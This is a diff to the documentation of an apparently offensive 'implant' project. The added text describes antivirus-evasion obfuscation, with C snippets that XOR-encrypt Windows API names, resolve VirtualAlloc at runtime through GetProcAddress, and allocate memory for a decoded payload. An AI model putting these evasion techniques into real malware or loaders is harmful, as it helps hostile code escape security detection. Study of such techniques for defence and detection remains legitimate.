@@ -343,8 +343,40 @@ This doesn't really have such an adverse effect on the detection rates. However,
 One of the methods AV engines flag malicious programs is by looking at the various functions they call at runtime as well as by using methods like `string` analysis. So what if we could just do away with that? We achieve this using two methods:
 
 - By replacing our easy-to-read function names with more sinister(i.e, random) ones. The `translate.txt` file corelates the original functions with the translated ones
-- As for native windows functions, instead of directly calling them, we first obtain the handle to the corresponding system DLL and use the `GetProcAddress()` function to retrieve the address of the corresponding function. To add to the obfuscation, we also XOR the string arguments passed to the function so as to not leave any trace behind.
-
+- As for native windows functions, instead of directly calling them, we first obtain the handle to the corresponding system DLL and use the `GetProcAddress()` function to retrieve the address of the corresponding function. To add to the obfuscation, we also XOR the string arguments passed to the function so as to not leave any trace behind. For example, we obfuscate `VirtualAlloc()` as such:
+```c
+/// In definitions.h
+// The function signature
+LPVOID (WINAPI * _VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
+....
+// Typedef
+typedef LPVOID (__stdcall * __type_virtualalloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
+....
+// XOR Encrypted function name
+unsigned char __virtualalloc[] = {0x17, 0x2b, 0x31, 0x30, 0x30, 0x27, 0x2b, 0x09, 0x25, 0x26, 0x24, 0x2f, 0x00 };
+..... 
+```
+```c
+/// In obfuscators.h
+// Decrypting XOR'd function name
+boUpJkYnxh29(__virtualalloc);
+// Getting handle to the function and appropriately typecasting it
+_VirtualAlloc = (__type_virtualalloc)GetProcAddress(_kernel32, (LPCSTR)__virtualalloc);
+// Manage Error
+if (_VirtualAlloc == NULL){
+    // fprintf(stderr, "Could not find VirtualAlloc in kernel32.dll\n");
+    return -10;
+}
+```
+```c
+/// In implant.cpp
+// Allocate a memory buffer for payload using new function
+exec_mem = _VirtualAlloc(0, decoded_data_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+if (exec_mem == NULL){
+    // fprintf(stderr, "VirtualAlloc Failed with error code: %d\n", GetLastError());
+    return -1;
+}
+```
 
 Once compiled, we can run `strings` from SysInternals to actually examine the resulting binary and notice that all the system function names previously being reflected in the output of the command are now gone.
 
